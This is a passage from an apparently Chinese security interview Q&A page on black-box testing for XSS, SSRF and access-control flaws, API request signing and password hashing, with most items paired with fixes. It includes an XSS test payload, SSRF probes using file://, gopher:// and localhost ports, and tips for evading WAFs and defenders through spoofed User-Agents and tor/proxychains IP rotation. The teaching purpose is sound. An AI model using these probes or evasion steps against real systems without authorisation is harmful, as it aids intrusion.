class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputFilter</span> <span class="variable">filter</span> <span class="operator">=</span> info -&gt; </span><br><span class="line">    info.serialClass() != <span class="literal">null</span> &amp;&amp; allowedClasses.contains(info.serialClass());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">ois.setObjectInputFilter(filter);</span><br></pre></td></tr></table></figure></h2><h3 id="黑盒如何检测-XSS-漏洞？"><a href="#黑盒如何检测-XSS-漏洞？" class="headerlink" title="黑盒如何检测 XSS 漏洞？"></a><strong>黑盒如何检测 XSS 漏洞？</strong></h3><p><strong>检测方式</strong>：</p>
<ol>
<li><strong>输入点探测</strong>：使用 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> 等 XSS 载荷测试输入点。</li>
<li><strong>DOM 分析</strong>：检测是否存在 <code>innerHTML</code>、<code>eval()</code> 等执行点。</li>
<li><strong>反射测试</strong>：提交特定字符，如 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，观察页面响应。</li>
<li><strong>CSP 绕过</strong>：如果目标启用了 CSP，测试 JSONP、数据 URL、WebSocket 等绕过方式。</li>
</ol>
<p><strong>自动化工具</strong>：</p>
<ul>
<li><strong>Burp Suite</strong>：使用 XSS 扩展（如 XSS Validator）自动检测。</li>
<li><strong>OWASP ZAP</strong>：启用 XSS 扫描规则，检测反射型 XSS。</li>
</ul>
<h2 id="修复方案：-使用-Content-Security-Policy-限制-JavaScript-执行来源。-采用-encodeURIComponent-对输入数据进行转义。"><a href="#修复方案：-使用-Content-Security-Policy-限制-JavaScript-执行来源。-采用-encodeURIComponent-对输入数据进行转义。" class="headerlink" title="修复方案：- 使用 Content-Security-Policy 限制 JavaScript 执行来源。- 采用 encodeURIComponent() 对输入数据进行转义。"></a><strong>修复方案</strong>：<br>- 使用 <code>Content-Security-Policy</code> 限制 JavaScript 执行来源。<br>- 采用 <code>encodeURIComponent()</code> 对输入数据进行转义。</h2><h4 id="甲方黑盒是否应具备爬取流量功能？"><a href="#甲方黑盒是否应具备爬取流量功能？" class="headerlink" title="甲方黑盒是否应具备爬取流量功能？"></a><strong>甲方黑盒是否应具备爬取流量功能？</strong></h4><p><strong>必要性</strong>：</p>
<ul>
<li><strong>需要</strong>：<ul>
<li>甲方安全团队通常用于渗透测试，爬取流量有助于发现隐藏接口。</li>
<li>适用于 API 端点挖掘、业务逻辑漏洞测试。</li>
</ul>
</li>
<li><strong>不需要</strong>：<ul>
<li>可能影响生产环境，增加服务器负载。</li>
<li>爬取可能涉及隐私数据，需符合合规要求。</li>
</ul>
</li>
</ul>
<h2 id="折中方案：-允许基于授权的爬取，并提供流量白名单机制。-结合-Web-日志和流量分析进行被动扫描。"><a href="#折中方案：-允许基于授权的爬取，并提供流量白名单机制。-结合-Web-日志和流量分析进行被动扫描。" class="headerlink" title="折中方案：- 允许基于授权的爬取，并提供流量白名单机制。- 结合 Web 日志和流量分析进行被动扫描。"></a><strong>折中方案</strong>：<br>- 允许基于授权的爬取，并提供流量白名单机制。<br>- 结合 Web 日志和流量分析进行被动扫描。</h2><h4 id="黑盒如何扫描无法出网的-SSRF？"><a href="#黑盒如何扫描无法出网的-SSRF？" class="headerlink" title="黑盒如何扫描无法出网的 SSRF？"></a><strong>黑盒如何扫描无法出网的 SSRF？</strong></h4><h2 id="方法：1-本地探测：-通过-file-、gopher-访问本地资源，测试服务器是否支持非-HTTP-请求。-使用-http-127-0-0-1-8000-admin-测试内网访问。2-DNSLog：-在内网部署-DNS-监听服务，检测服务器是否尝试解析域名：-3-端口扫描：-通过-http-127-0-0-1-22、http-localhost-3306-发现内部服务。-结合-burp-collaborator-进行-OOB-测试。修复方案：-限制外部请求的目标-IP，仅允许可信域名访问。-关闭-gopher-、file-等不必要的协议支持。"><a href="#方法：1-本地探测：-通过-file-、gopher-访问本地资源，测试服务器是否支持非-HTTP-请求。-使用-http-127-0-0-1-8000-admin-测试内网访问。2-DNSLog：-在内网部署-DNS-监听服务，检测服务器是否尝试解析域名：-3-端口扫描：-通过-http-127-0-0-1-22、http-localhost-3306-发现内部服务。-结合-burp-collaborator-进行-OOB-测试。修复方案：-限制外部请求的目标-IP，仅允许可信域名访问。-关闭-gopher-、file-等不必要的协议支持。" class="headerlink" title="方法：1. 本地探测：   - 通过 file://、gopher:// 访问本地资源，测试服务器是否支持非 HTTP 请求。   - 使用 http://127.0.0.1:8000/admin 测试内网访问。2. DNSLog：   - 在内网部署 DNS 监听服务，检测服务器是否尝试解析域名：     3. 端口扫描：   - 通过 http://127.0.0.1:22、http://localhost:3306 发现内部服务。   - 结合 burp-collaborator 进行 OOB 测试。修复方案：- 限制外部请求的目标 IP，仅允许可信域名访问。- 关闭 gopher://、file:// 等不必要的协议支持。"></a><strong>方法</strong>：<br>1. <strong>本地探测</strong>：<br>   - 通过 <code>file://</code>、<code>gopher://</code> 访问本地资源，测试服务器是否支持非 HTTP 请求。<br>   - 使用 <code>http://127.0.0.1:8000/admin</code> 测试内网访问。<br>2. <strong>DNSLog</strong>：<br>   - 在内网部署 DNS 监听服务，检测服务器是否尝试解析域名：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> example.com</span><br></pre></td></tr></table></figure><br>3. <strong>端口扫描</strong>：<br>   - 通过 <code>http://127.0.0.1:22</code>、<code>http://localhost:3306</code> 发现内部服务。<br>   - 结合 <code>burp-collaborator</code> 进行 OOB 测试。<br><strong>修复方案</strong>：<br>- 限制外部请求的目标 IP，仅允许可信域名访问。<br>- 关闭 <code>gopher://</code>、<code>file://</code> 等不必要的协议支持。</h2><h4 id="黑盒如何扫描越权漏洞？"><a href="#黑盒如何扫描越权漏洞？" class="headerlink" title="黑盒如何扫描越权漏洞？"></a><strong>黑盒如何扫描越权漏洞？</strong></h4><h2 id="方法：1-水平越权测试：-用户-A-访问用户-B-数据：-替换-UID-观察返回数据是否可访问。2-垂直越权测试：-低权限用户尝试访问管理员接口：-检查是否返回-403，或尝试不同角色访问。3-Token-替换：-使用已登录用户的-JWT、Cookie，切换身份，观察权限控制情况。修复方案：-采用-RBAC（基于角色的访问控制），避免-IDOR（不安全的直接对象引用）。-在后端校验用户权限，而非仅依赖前端逻辑。"><a href="#方法：1-水平越权测试：-用户-A-访问用户-B-数据：-替换-UID-观察返回数据是否可访问。2-垂直越权测试：-低权限用户尝试访问管理员接口：-检查是否返回-403，或尝试不同角色访问。3-Token-替换：-使用已登录用户的-JWT、Cookie，切换身份，观察权限控制情况。修复方案：-采用-RBAC（基于角色的访问控制），避免-IDOR（不安全的直接对象引用）。-在后端校验用户权限，而非仅依赖前端逻辑。" class="headerlink" title="方法：1. 水平越权测试：   - 用户 A 访问用户 B 数据：          - 替换 UID 观察返回数据是否可访问。2. 垂直越权测试：   - 低权限用户尝试访问管理员接口：          - 检查是否返回 403，或尝试不同角色访问。3. Token 替换：   - 使用已登录用户的 JWT、Cookie，切换身份，观察权限控制情况。修复方案：- 采用 RBAC（基于角色的访问控制），避免 IDOR（不安全的直接对象引用）。- 在后端校验用户权限，而非仅依赖前端逻辑。"></a><strong>方法</strong>：<br>1. <strong>水平越权测试</strong>：<br>   - <strong>用户 A 访问用户 B 数据</strong>：<br>     <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /user/profile?uid=10086</span><br></pre></td></tr></table></figure><br>     - 替换 UID 观察返回数据是否可访问。<br>2. <strong>垂直越权测试</strong>：<br>   - 低权限用户尝试访问管理员接口：<br>     <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/dashboard</span><br></pre></td></tr></table></figure><br>     - 检查是否返回 403，或尝试不同角色访问。<br>3. <strong>Token 替换</strong>：<br>   - 使用已登录用户的 <code>JWT</code>、<code>Cookie</code>，切换身份，观察权限控制情况。<br><strong>修复方案</strong>：<br>- 采用 <strong>RBAC（基于角色的访问控制）</strong>，避免 IDOR（不安全的直接对象引用）。<br>- 在后端校验用户权限，而非仅依赖前端逻辑。</h2><h4 id="黑盒带登录态扫描如何规避业务影响？"><a href="#黑盒带登录态扫描如何规避业务影响？" class="headerlink" title="黑盒带登录态扫描如何规避业务影响？"></a><strong>黑盒带登录态扫描如何规避业务影响？</strong></h4><p><strong>方法</strong>：</p>
<ol>
<li><strong>限制扫描速率</strong>：<ul>
<li>采用 <strong>请求间隔策略</strong>，防止对应用服务器造成高负载：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rate-limit: 10 requests/sec</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>非关键业务时段测试</strong>：<ul>
<li>在低峰时段（如凌晨）执行扫描，避免影响正常用户。</li>
</ul>
</li>
<li><strong>模拟正常用户行为</strong>：<ul>
<li>通过 <strong>Session 复用</strong>，减少多次登录请求，避免触发风控。</li>
</ul>
</li>
<li><strong>创建测试账号</strong>：<ul>
<li>在测试环境使用专用账号，避免影响真实用户数据。</li>
</ul>
</li>
</ol>
<h2 id="修复方案：-使用-WAF-规则-限制高频异常请求。-采用-测试环境，避免在生产环境直接扫描。"><a href="#修复方案：-使用-WAF-规则-限制高频异常请求。-采用-测试环境，避免在生产环境直接扫描。" class="headerlink" title="修复方案：- 使用 WAF 规则 限制高频异常请求。- 采用 测试环境，避免在生产环境直接扫描。"></a><strong>修复方案</strong>：<br>- 使用 <strong>WAF 规则</strong> 限制高频异常请求。<br>- 采用 <strong>测试环境</strong>，避免在生产环境直接扫描。</h2><h4 id="黑盒扫描时如何避免被反制？"><a href="#黑盒扫描时如何避免被反制？" class="headerlink" title="黑盒扫描时如何避免被反制？"></a><strong>黑盒扫描时如何避免被反制？</strong></h4><p><strong>常见反制机制</strong>：</p>
<ul>
<li><strong>WAF 拦截</strong>：基于 IP 频率、User-Agent 检测扫描工具。</li>
<li><strong>验证码机制</strong>：要求用户交互，防止自动化请求。</li>
<li><strong>流量异常检测</strong>：检测短时间内大量请求并封禁。</li>
</ul>
<p><strong>规避方案</strong>：</p>
<ol>
<li><strong>伪装请求</strong>：<ul>
<li>使用常见的 <code>User-Agent</code> 伪装扫描流量：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>IP 轮换</strong>：<ul>
<li>通过代理池（如 <code>tor</code> 或 <code>proxychains</code>）更换 IP：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p 80 target.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>低频扫描</strong>：<ul>
<li>使用 <strong>时间间隔控制</strong>，避免短时间大量请求。</li>
</ul>
</li>
<li><strong>模拟正常用户行为</strong>：<ul>
<li>结合 <strong>真实浏览器</strong> 进行测试，如 Puppeteer，绕过基于浏览器指纹检测的反制。</li>
</ul>
</li>
</ol>
<h2 id="长期策略：-采用-企业级资产扫描工具（如-Burp-Suite-Headless-Chrome），绕过简单的-WAF-防护。"><a href="#长期策略：-采用-企业级资产扫描工具（如-Burp-Suite-Headless-Chrome），绕过简单的-WAF-防护。" class="headerlink" title="长期策略：- 采用 企业级资产扫描工具（如 Burp Suite + Headless Chrome），绕过简单的 WAF 防护。"></a><strong>长期策略</strong>：<br>- 采用 <strong>企业级资产扫描工具</strong>（如 <strong>Burp Suite + Headless Chrome</strong>），绕过简单的 WAF 防护。</h2><h4 id="灰盒相较于黑白盒的优势是什么？"><a href="#灰盒相较于黑白盒的优势是什么？" class="headerlink" title="灰盒相较于黑白盒的优势是什么？"></a><strong>灰盒相较于黑白盒的优势是什么？</strong></h4><h2 id="灰盒测试的优势：-结合黑盒与白盒测试：-既能利用内部信息（如-API-文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。-提高测试覆盖率：-通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。-减少误报：-由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。"><a href="#灰盒测试的优势：-结合黑盒与白盒测试：-既能利用内部信息（如-API-文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。-提高测试覆盖率：-通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。-减少误报：-由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。" class="headerlink" title="灰盒测试的优势：- 结合黑盒与白盒测试：  - 既能利用内部信息（如 API 文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。- 提高测试覆盖率：  - 通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。- 减少误报：  - 由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。"></a><strong>灰盒测试的优势</strong>：<br>- <strong>结合黑盒与白盒测试</strong>：<br>  - 既能利用内部信息（如 API 文档、部分代码访问权限）提高测试效率，又能模拟真实攻击场景进行漏洞挖掘。<br>- <strong>提高测试覆盖率</strong>：<br>  - 通过部分源代码和接口权限，测试人员可以更精确地分析逻辑漏洞，如权限绕过、业务滥用。<br>- <strong>减少误报</strong>：<br>  - 由于可访问部分内部逻辑，减少黑盒测试中的误报，提高漏洞发现的准确性。</h2><h4 id="抽象来看，安全评估到底要评什么东西？"><a href="#抽象来看，安全评估到底要评什么东西？" class="headerlink" title="抽象来看，安全评估到底要评什么东西？"></a><strong>抽象来看，安全评估到底要评什么东西？</strong></h4><h2 id="安全评估核心：1-攻击面分析：-识别可能的攻击入口，包括-API、Web-界面、数据库、第三方集成等。2-数据安全：-评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3-身份与权限管理：-检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4-漏洞扫描与测试：-进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5-业务逻辑风险：-识别如支付绕过、积分滥用、订单劫持等业务漏洞。"><a href="#安全评估核心：1-攻击面分析：-识别可能的攻击入口，包括-API、Web-界面、数据库、第三方集成等。2-数据安全：-评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3-身份与权限管理：-检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4-漏洞扫描与测试：-进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5-业务逻辑风险：-识别如支付绕过、积分滥用、订单劫持等业务漏洞。" class="headerlink" title="安全评估核心：1. 攻击面分析：   - 识别可能的攻击入口，包括 API、Web 界面、数据库、第三方集成等。2. 数据安全：   - 评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。3. 身份与权限管理：   - 检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。4. 漏洞扫描与测试：   - 进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。5. 业务逻辑风险：   - 识别如支付绕过、积分滥用、订单劫持等业务漏洞。"></a><strong>安全评估核心</strong>：<br>1. <strong>攻击面分析</strong>：<br>   - 识别可能的攻击入口，包括 API、Web 界面、数据库、第三方集成等。<br>2. <strong>数据安全</strong>：<br>   - 评估数据存储、传输及访问控制的安全性，防止数据泄露和未授权访问。<br>3. <strong>身份与权限管理</strong>：<br>   - 检查认证方式（JWT、OAuth）、权限控制机制（RBAC、ABAC）。<br>4. <strong>漏洞扫描与测试</strong>：<br>   - 进行静态代码分析（SAST）、动态测试（DAST）、模糊测试（Fuzzing）。<br>5. <strong>业务逻辑风险</strong>：<br>   - 识别如支付绕过、积分滥用、订单劫持等业务漏洞。</h2><h4 id="一个应用开放出去-API，可能存在哪些风险以及如何应对？"><a href="#一个应用开放出去-API，可能存在哪些风险以及如何应对？" class="headerlink" title="一个应用开放出去 API，可能存在哪些风险以及如何应对？"></a><strong>一个应用开放出去 API，可能存在哪些风险以及如何应对？</strong></h4><p><strong>可能的安全风险</strong>：</p>
<ol>
<li><p><strong>数据传输风险</strong>：</p>
<ul>
<li><strong>明文传输</strong>：未使用 HTTPS，导致流量被窃听。</li>
<li><strong>中间人攻击</strong>：未验证服务器证书，攻击者可拦截 API 请求。</li>
</ul>
</li>
<li><p><strong>身份认证风险</strong>：</p>
<ul>
<li><strong>缺乏 API 访问控制</strong>：攻击者可直接调用 API 获取数据。</li>
<li><strong>硬编码 API Key</strong>：客户端应用存储 API 密钥，容易泄露。</li>
</ul>
</li>
<li><p><strong>请求完整性风险</strong>：</p>
<ul>
<li><strong>请求伪造</strong>：攻击者篡改请求参数，如修改支付金额、用户 ID。</li>
<li><strong>重放攻击</strong>：攻击者捕获合法请求并多次发送。</li>
</ul>
</li>
</ol>
<h2 id="应对措施：-加密传输：强制使用-HTTPS，并启用-HSTS-保护。-身份认证：使用-OAuth2-0、JWT-或-API-Key-结合-HMAC-签名。-请求防护：-使用-请求签名机制，防止篡改和重放攻击。-添加-时间戳-随机数，确保请求唯一性。"><a href="#应对措施：-加密传输：强制使用-HTTPS，并启用-HSTS-保护。-身份认证：使用-OAuth2-0、JWT-或-API-Key-结合-HMAC-签名。-请求防护：-使用-请求签名机制，防止篡改和重放攻击。-添加-时间戳-随机数，确保请求唯一性。" class="headerlink" title="应对措施：- 加密传输：强制使用 HTTPS，并启用 HSTS 保护。- 身份认证：使用 OAuth2.0、JWT 或 API Key 结合 HMAC 签名。- 请求防护：  - 使用 请求签名机制，防止篡改和重放攻击。  - 添加 时间戳 + 随机数，确保请求唯一性。"></a><strong>应对措施</strong>：<br>- <strong>加密传输</strong>：强制使用 HTTPS，并启用 HSTS 保护。<br>- <strong>身份认证</strong>：使用 OAuth2.0、JWT 或 API Key 结合 HMAC 签名。<br>- <strong>请求防护</strong>：<br>  - 使用 <strong>请求签名机制</strong>，防止篡改和重放攻击。<br>  - 添加 <strong>时间戳</strong> + <strong>随机数</strong>，确保请求唯一性。</h2><h4 id="设计-API-签名时，随机数使用秒时间戳（timestamp-s）会存在哪些风险？"><a href="#设计-API-签名时，随机数使用秒时间戳（timestamp-s）会存在哪些风险？" class="headerlink" title="设计 API 签名时，随机数使用秒时间戳（timestamp&#x2F;s）会存在哪些风险？"></a><strong>设计 API 签名时，随机数使用秒时间戳（timestamp&#x2F;s）会存在哪些风险？</strong></h4><p><strong>主要风险</strong>：</p>
<ol>
<li><strong>重放攻击</strong>：<ul>
<li>攻击者在 1 秒内多次发送相同请求，绕过签名验证。</li>
</ul>
</li>
<li><strong>时间偏移问题</strong>：<ul>
<li>服务器与客户端时钟不同步，导致请求被拒绝。</li>
</ul>
</li>
<li><strong>可预测性</strong>：<ul>
<li>攻击者可猜测时间戳，生成可能的签名进行伪造。</li>
</ul>
</li>
</ol>
<h2 id="应对方案：-使用毫秒级时间戳（timestamp-ms）降低重放窗口。-引入随机数（nonce），确保每次请求的唯一性："><a href="#应对方案：-使用毫秒级时间戳（timestamp-ms）降低重放窗口。-引入随机数（nonce），确保每次请求的唯一性：" class="headerlink" title="应对方案：- 使用毫秒级时间戳（timestamp&#x2F;ms）降低重放窗口。- 引入随机数（nonce），确保每次请求的唯一性：  "></a><strong>应对方案</strong>：<br>- <strong>使用毫秒级时间戳</strong>（timestamp&#x2F;ms）降低重放窗口。<br>- <strong>引入随机数（nonce）</strong>，确保每次请求的唯一性：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestamp = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">nonce = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">signature = hmac_sha256(secret_key, timestamp + nonce + payload)</span><br></pre></td></tr></table></figure></h2><h4 id="设计-API-签名时，HMAC-SHA256-和-SHA256-区别是什么？"><a href="#设计-API-签名时，HMAC-SHA256-和-SHA256-区别是什么？" class="headerlink" title="设计 API 签名时，HMAC SHA256 和 SHA256 区别是什么？"></a><strong>设计 API 签名时，HMAC SHA256 和 SHA256 区别是什么？</strong></h4><p><strong>SHA256</strong>：</p>
<ul>
<li><strong>单向哈希算法</strong>，不可逆，可用于密码存储。</li>
<li><strong>无密钥机制</strong>，容易受到 <strong>长度扩展攻击</strong>（Length Extension Attack）。</li>
</ul>
<h2 id="HMAC-SHA256：-基于-SHA256-的加密哈希消息认证码（Hash-based-Message-Authentication-Code）。-使用密钥进行哈希计算：-安全性更高：HMAC-通过密钥增强安全性，避免-SHA256-可能被伪造。"><a href="#HMAC-SHA256：-基于-SHA256-的加密哈希消息认证码（Hash-based-Message-Authentication-Code）。-使用密钥进行哈希计算：-安全性更高：HMAC-通过密钥增强安全性，避免-SHA256-可能被伪造。" class="headerlink" title="HMAC SHA256：- 基于 SHA256 的加密哈希消息认证码（Hash-based Message Authentication Code）。- 使用密钥进行哈希计算：  - 安全性更高：HMAC 通过密钥增强安全性，避免 SHA256 可能被伪造。"></a><strong>HMAC SHA256</strong>：<br>- <strong>基于 SHA256 的加密哈希消息认证码</strong>（Hash-based Message Authentication Code）。<br>- <strong>使用密钥进行哈希计算</strong>：<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">message = <span class="string">&quot;data-to-sign&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;my-secret-key&quot;</span></span><br><span class="line">signature = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256).hexdigest()</span><br></pre></td></tr></table></figure><br>- <strong>安全性更高</strong>：HMAC 通过密钥增强安全性，避免 SHA256 可能被伪造。</h2><h4 id="密码如何加密保存？"><a href="#密码如何加密保存？" class="headerlink" title="密码如何加密保存？"></a><strong>密码如何加密保存？</strong></h4><h2 id="密码存储最佳实践：1-使用强哈希算法：-推荐使用-PBKDF2、bcrypt-或-scrypt，避免使用-MD5、SHA1、SHA256-直接存储。2-添加随机盐（Salt）：-解决-彩虹表攻击，确保相同密码哈希值不同。3-使用密钥推导函数：-PBKDF2（基于-HMAC-的密钥派生）：-bcrypt（适用于-Web-应用）：-scrypt（适用于高安全场景）：-4-避免明文存储：-严禁存储明文密码，所有密码必须经过安全哈希处理。"><a href="#密码存储最佳实践：1-使用强哈希算法：-推荐使用-PBKDF2、bcrypt-或-scrypt，避免使用-MD5、SHA1、SHA256-直接存储。2-添加随机盐（Salt）：-解决-彩虹表攻击，确保相同密码哈希值不同。3-使用密钥推导函数：-PBKDF2（基于-HMAC-的密钥派生）：-bcrypt（适用于-Web-应用）：-scrypt（适用于高安全场景）：-4-避免明文存储：-严禁存储明文密码，所有密码必须经过安全哈希处理。" class="headerlink" title="密码存储最佳实践：1. 使用强哈希算法：   - 推荐使用 PBKDF2、bcrypt 或 scrypt，避免使用 MD5、SHA1、SHA256 直接存储。2. 添加随机盐（Salt）：   - 解决 彩虹表攻击，确保相同密码哈希值不同。3. 使用密钥推导函数：   - PBKDF2（基于 HMAC 的密钥派生）：        - bcrypt（适用于 Web 应用）：        - scrypt（适用于高安全场景）：     4. 避免明文存储：   - 严禁存储明文密码，所有密码必须经过安全哈希处理。"></a><strong>密码存储最佳实践</strong>：<br>1. <strong>使用强哈希算法</strong>：<br>   - 推荐使用 <strong>PBKDF2</strong>、<strong>bcrypt</strong> 或 <strong>scrypt</strong>，避免使用 MD5、SHA1、SHA256 直接存储。<br>2. <strong>添加随机盐（Salt）</strong>：<br>   - 解决 <strong>彩虹表攻击</strong>，确保相同密码哈希值不同。<br>3. <strong>使用密钥推导函数</strong>：<br>   - <strong>PBKDF2</strong>（基于 HMAC 的密钥派生）：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, os</span><br><span class="line">salt = os.urandom(<span class="number">16</span>)</span><br><span class="line">password_hash = hashlib.pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, password.encode(), salt, <span class="number">100000</span>)</span><br></pre></td></tr></table></figure><br>   - <strong>bcrypt</strong>（适用于 Web 应用）：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcrypt <span class="keyword">import</span> gensalt, hashpw</span><br><span class="line">hashed = hashpw(password.encode(), gensalt())</span><br></pre></td></tr></table></figure><br>   - <strong>scrypt</strong>（适用于高安全场景）：<br>     <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hashed = hashlib.scrypt(password.encode(), salt=os.urandom(<span class="number">16</span>), n=<span class="number">16384</span>, r=<span class="number">8</span>, p=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><br>4. <strong>避免明文存储</strong>：<br>   - 严禁存储明文密码，所有密码必须经过安全哈希处理。</h2><h4 id="某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？"><a href="#某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？" class="headerlink" title="某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？"></a><strong>某些场景（登录、注册、修改密码、支付）会存在哪些风险以及如何防范？</strong></h4><p><strong>常见风险</strong>：</p>
<ol>
<li><p><strong>登录</strong>：</p>
<ul>
<li><strong>暴力破解</strong>：攻击者不断尝试用户名密码组合。</li>
<li><strong>凭证泄露</strong>：弱密码或数据库泄露导致账号被盗。</li>
<li><strong>会话固定攻击</strong>：攻击者利用固定 Session ID 劫持用户身份。</li>
</ul>
</li>
<li><p><strong>注册</strong>：</p>
<ul>
<li><strong>自动化注册</strong>：攻击者批量注册垃圾账号（如 CAPTCHA 绕过）。</li>
<li><strong>手机号&#x2F;邮箱占用</strong>：利用他人信息恶意占号。</li>
</ul>
</li>
<li><p><strong>修改密码</strong>：</p>
<ul>
<li><strong>未验证原密码</strong>：直接允许修改密码，导致账号被盗。</li>
<li><strong>邮件链接劫持</strong>：重置密码链接未使用一次性 Token，容易被劫持。</li>
</ul>
</li>
<li><p><strong>支付</strong>：</p>
<ul>
<li><strong>金额篡改</strong>：客户端数据未加签，攻击者可篡改支付金额。</li>
<li><strong>订单重放</strong>：未加随机数的请求被重复提交，造成资金损失。</li>
</ul>
</li>
</ol>
<h2 id="防范措施：-登录：使用验证码、IP-频率限制、二次验证（2FA）。-注册：限制批量注册（如基于行为分析检测）。-修改密码：要求输入旧密码，或进行二次验证（短信-邮件）。-支付：使用-HMAC-签名，防止请求篡改，启用-幂等机制-避免重复支付。"><a href="#防范措施：-登录：使用验证码、IP-频率限制、二次验证（2FA）。-注册：限制批量注册（如基于行为分析检测）。-修改密码：要求输入旧密码，或进行二次验证（短信-邮件）。-支付：使用-HMAC-签名，防止请求篡改，启用-幂等机制-避免重复支付。" class="headerlink" title="防范措施：- 登录：使用验证码、IP 频率限制、二次验证（2FA）。- 注册：限制批量注册（如基于行为分析检测）。- 修改密码：要求输入旧密码，或进行二次验证（短信&#x2F;邮件）。- 支付：使用 HMAC 签名，防止请求篡改，启用 幂等机制 避免重复支付。"></a><strong>防范措施</strong>：<br>- <strong>登录</strong>：使用验证码、IP 频率限制、二次验证（2FA）。<br>- <strong>注册</strong>：限制批量注册（如基于行为分析检测）。<br>- <strong>修改密码</strong>：要求输入旧密码，或进行二次验证（短信&#x2F;邮件）。<br>- <strong>支付</strong>：使用 <strong>HMAC 签名</strong>，防止请求篡改，启用 <strong>幂等机制</strong> 避免重复支付。</h2><h4 id="新应用如何评估安全风险？"><a href="#新应用如何评估安全风险？" class="headerlink" title="新应用如何评估安全风险？"></a><strong>新应用如何评估安全风险？</strong></h4><h2 id="评估方法：1-攻击面分析：-识别-API、前端、数据库、第三方集成的潜在漏洞点。2-身份认证与访问控制：-确保使用-JWT、OAuth-进行身份认证，避免越权访问。3-数据保护：-敏感数据加密存储，防止数据泄露。4-业务逻辑漏洞：-评估支付、交易等关键功能，防止恶意利用。"><a href="#评估方法：1-攻击面分析：-识别-API、前端、数据库、第三方集成的潜在漏洞点。2-身份认证与访问控制：-确保使用-JWT、OAuth-进行身份认证，避免越权访问。3-数据保护：-敏感数据加密存储，防止数据泄露。4-业务逻辑漏洞：-评估支付、交易等关键功能，防止恶意利用。" class="headerlink" title="评估方法：1. 攻击面分析：   - 识别 API、前端、数据库、第三方集成的潜在漏洞点。2. 身份认证与访问控制：   - 确保使用 JWT、OAuth 进行身份认证，避免越权访问。3. 数据保护：   - 敏感数据加密存储，防止数据泄露。4. 业务逻辑漏洞：   - 评估支付、交易等关键功能，防止恶意利用。"></a><strong>评估方法</strong>：<br>1. <strong>攻击面分析</strong>：<br>   - 识别 API、前端、数据库、第三方集成的潜在漏洞点。<br>2. <strong>身份认证与访问控制</strong>：<br>   - 确保使用 JWT、OAuth 进行身份认证，避免越权访问。<br>3. <strong>数据保护</strong>：<br>   - 敏感数据加密存储，防止数据泄露。<br>4. 